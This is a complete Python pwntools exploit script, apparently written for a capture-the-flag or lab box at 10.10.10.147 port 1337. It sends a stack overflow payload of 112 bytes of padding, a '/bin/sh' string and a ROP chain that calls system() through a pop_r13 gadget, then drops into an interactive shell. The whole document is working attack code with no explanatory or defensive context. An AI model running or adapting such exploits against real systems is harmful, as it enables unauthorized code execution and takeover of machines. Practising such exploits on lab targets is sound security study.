#!/usr/bin/python3

from pwn import *


def main():

    context(terminal=["tmux", "new-window"])
    context(os="linux", arch="amd64")

    conn = remote("10.10.10.147", 1337)

    # defyning offset
    offset = b"A"*112
    cmd = b"/bin/sh\x00"

    pop_r13 = p64(0x401206)
    system = p64(0x401040)
    test = p64(0x401152)
    null_byte = p64(0x0)

    # exploting
    exploit = offset + cmd + pop_r13 + system + null_byte + null_byte + test

    conn.sendline(exploit)
    conn.interactive()


if __name__ == "__main__":
    main()
